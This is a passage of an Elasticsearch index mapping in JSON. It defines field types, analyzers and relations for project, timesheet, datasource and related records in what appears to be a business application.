            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fid-a" : {
                "type" : "string"
              },
              "stc_fid-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_files" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_formula" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_formula-a" : {
                "type" : "string"
              },
              "stc_formula-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_hidden" : {
            "type" : "boolean"
          },
          "stc_identifier" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_immutable" : {
            "type" : "boolean"
          },
          "stc_important" : {
            "type" : "boolean"
          },
          "stc_informative" : {
            "type" : "boolean"
          },
          "stc_label" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_label-a" : {
                "type" : "string"
              },
              "stc_label-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_mappings" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_mappings-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_mappings-a" : {
                "type" : "string"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_name-ng" : {
                "type" : "string",
                "index_analyzer" : "nGram_analyzer",
                "search_analyzer" : "whitespace_analyzer"
              },
              "stc_name-a" : {
                "type" : "string"
              },
              "stc_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_notes" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_notes-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_notes-a" : {
                "type" : "string"
              }
            }
          },
          "stc_object" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_options" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_options-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_options-a" : {
                "type" : "string"
              }
            }
          },
          "stc_overridable" : {
            "type" : "boolean"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_placeholder" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_placeholder-a" : {
                "type" : "string"
              },
              "stc_placeholder-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_position" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "object",
            "dynamic" : "true"
          },
          "stc_protected" : {
            "type" : "boolean"
          },
          "stc_question" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_question-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_question-a" : {
                "type" : "string"
              }
            }
          },
          "stc_related_items" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_required" : {
            "type" : "boolean"
          },
          "stc_sample" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_sample-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_sample-a" : {
                "type" : "string"
              }
            }
          },
          "stc_step" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_tags" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_tags-a" : {
                "type" : "string"
              },
              "stc_tags-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_uneditable" : {
            "type" : "boolean"
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_validation" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_validation-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_validation-a" : {
                "type" : "string"
              }
            }
          },
          "stc_variation" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          }
        }
      },
      "tmp_project" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_copyright" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_connection" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_files" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_due_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_created_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_updated_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_workflow" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_fid" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_description" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_context" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_access" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_name" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitions" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_notes" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_tags" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
              "es_schema" : {
                "type" : "string",
                "analyzed" : "not_analyzed"
              }
            },
            "stc_token" : {
              "type" : "UUID",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_start_date" : {
              "type" : "Date",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_end_date" : {
              "type" : "Date",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            }
          },
          "has1Relations" : {
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "tmp_customer" : {
              "fieldName" : "tmp_customer",
              "relatedTableName" : "stc_company"
            },
            "tmp_sow" : {
              "fieldName" : "tmp_sow",
              "relatedTableName" : "su_contract"
            }
          },
          "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
          "signature" : 2022912386,
          "timestamp" : 1409751477508
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_comments-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_comments-a" : {
                "type" : "string"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_files" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_files-a" : {
                "type" : "string"
              },
              "stc_files-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_notes" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_properties-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_properties-a" : {
                "type" : "string"
              }
            }
          },
          "stc_related_items" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_related_items-a" : {
                "type" : "string"
              },
              "stc_related_items-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string"
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "tmp_customer" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_end_date" : {
            "type" : "date",
            "doc_values_format" : "disk",
            "format" : "dateOptionalTime"
          },
          "tmp_sow" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_start_date" : {
            "type" : "date",
            "doc_values_format" : "disk",
            "format" : "dateOptionalTime"
          }
        }
      },
      "stc_datasource" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_name" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_type" : {
              "type" : "String"
            },
            "stc_custodian" : {
              "type" : "String"
            },
            "stc_index" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_version" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_link" : {
              "type" : "String"
            },
            "stc_folder_identifier" : {
              "type" : "String"
            },
            "stc_folder_link" : {
              "type" : "String"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datatype" : "stc_attributes"
            },
            "stc_description" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_notes" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_workflow" : {
              "type" : "String"
            },
            "stc_token" : {
              "type" : "UUID"
            },
            "stc_transitions" : {
              "type" : "JSON"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_files" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_tags" : {
              "type" : "JSON"
            },
            "stc_due_on" : {
              "type" : "Timestamp"
            },
            "stc_access" : {
              "type" : "JSON"
            },
            "stc_created_on" : {
              "type" : "Timestamp"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp"
            },
            "stc_updated_on" : {
              "type" : "Timestamp"
            },
            "stc_fid" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_connection" : {
              "type" : "JSON"
            },
            "stc_context" : {
              "type" : "JSON"
            },
            "stc_copyright" : {
              "type" : "JSON"
            }
          },
          "has1Relations" : {
            "stc_application" : {
              "fieldName" : "stc_application",
              "relatedTableName" : "stc_application"
            },
            "stc_object" : {
              "fieldName" : "stc_object",
              "relatedTableName" : "stc_object"
            },
            "stc_alias_of" : {
              "fieldName" : "stc_alias_of",
              "relatedTableName" : "stc_datasource"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            }
          },
          "datasource" : "d63fded1-043c-43ad-9135-d96b6d16cced",
          "signature" : 1086336140,
          "timestamp" : 1409751256391
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_alias_of" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_application" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_custodian" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_description-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_description-a" : {
                "type" : "string"
              }
            }
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fid-a" : {
                "type" : "string"
              },
              "stc_fid-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_files" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_folder_identifier" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_folder_link" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_index" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_index-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_index-a" : {
                "type" : "string"
              }
            }
          },
          "stc_link" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_name-ng" : {
                "type" : "string",
                "index_analyzer" : "nGram_analyzer",
                "search_analyzer" : "whitespace_analyzer"
              },
              "stc_name-a" : {
                "type" : "string"
              },
              "stc_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_notes" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_notes-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_notes-a" : {
                "type" : "string"
              }
            }
          },
          "stc_object" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "object",
            "dynamic" : "true"
          },
          "stc_related_items" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_tags-a" : {
                "type" : "string"
              },
              "stc_tags-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_type" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_version" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_version-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_version-a" : {
                "type" : "string"
              }
            }
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          }
        }
      },
      "fork" : {
        "include_in_all" : false,
        "properties" : {
          "cacheKey" : {
            "type" : "long",
            "include_in_all" : false
          },
          "datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          },
          "list" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          },
          "namespace" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          },
          "timestamp" : {
            "type" : "date",
            "format" : "dateOptionalTime",
            "include_in_all" : false
          },
          "version" : {
            "type" : "string",
            "index" : "not_analyzed",
            "include_in_all" : false
          }
        }
      },
      "tmp_timesheet" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_tags" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
              "es_schema" : {
                "type" : "string",
                "analyzed" : "not_analyzed"
              }
            },
            "stc_copyright" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_connection" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_files" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_due_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_created_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_updated_on" : {
              "type" : "Timestamp",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_workflow" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_fid" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_description" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_context" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_access" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_name" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_transitions" : {
              "type" : "JSON",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_notes" : {
              "type" : "String",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "stc_token" : {
              "type" : "UUID",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_start_date" : {
              "type" : "Date",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_end_date" : {
              "type" : "Date",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_nb_hours" : {
              "type" : "Integer",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_billable" : {
              "type" : "Boolean",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            },
            "tmp_fee" : {
              "type" : "Float",
              "datasource" : "75994729-9054-40ec-9bdd-414366739e51"
            }
          },
          "has1Relations" : {
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "tmp_collaborator" : {
              "fieldName" : "tmp_collaborator",
              "relatedTableName" : "su_collaborator"
            },
            "tmp_customer" : {
              "fieldName" : "tmp_customer",
              "relatedTableName" : "stc_company"
            }
          },
          "datasource" : "75994729-9054-40ec-9bdd-414366739e51",
          "signature" : 134707084,
          "timestamp" : 1409751247005
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_comments" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_comments-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_comments-a" : {
                "type" : "string"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
